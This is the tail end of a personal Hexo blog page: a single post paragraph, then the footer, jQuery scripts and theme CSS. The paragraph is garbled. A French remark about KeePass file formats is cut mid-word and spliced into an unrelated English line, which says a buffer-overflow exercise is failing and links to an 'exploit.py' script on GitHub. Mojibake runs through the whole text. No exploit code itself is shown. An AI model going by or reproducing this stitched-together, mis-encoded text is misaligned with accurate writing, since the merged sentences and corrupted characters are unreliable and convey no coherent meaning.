<p>Iâ€™ah oui ok, si tu as keepass 2 câ€™est la mÃªme format, si tu as keepass 1 il faut migrerve learned a lot but itâ€™s not working, even with a script on github:<br><a href="https://github.com/joshua17sc/Buffer-Overflows/blob/main/exploit.py">https://github.com/joshua17sc/Buffer-Overflows/blob/main/exploit.py</a></p>

      
       
    </div>
</article>







    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    Â©2021 Peanutstick&#39;s Blog
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="åˆ‡æ¢å…¨å± å¿«æ·é”® s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*æ¸²æŸ“å¯¹åº”çš„è¡¨æ ¼æ ·å¼*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*æ¸²æŸ“æ‰“èµæ ·å¼*/
        

        /*é«˜äº®ä»£ç å—è¡Œå·*/
        

        /*è®¿é—®æ•°é‡*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*ä»£ç é«˜äº®ï¼Œè¡Œå·å¯¹é½*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*æ‰“èµé¡µé¢éšè—ä¸Žå±•ç¤º*/
    

</script>

<!--åŠ å…¥è¡Œå·çš„é«˜äº®ä»£ç å—æ ·å¼-->

<!--è‡ªå®šä¹‰æ ·å¼è®¾ç½®-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*åˆ—è¡¨æ ·å¼*/
    

    /* èƒŒæ™¯å›¾æ ·å¼ */
    
    


    /*å¼•ç”¨å—æ ·å¼*/
    

    /*æ–‡ç« åˆ—è¡¨èƒŒæ™¯å›¾*/
    

    
</style>







</html>
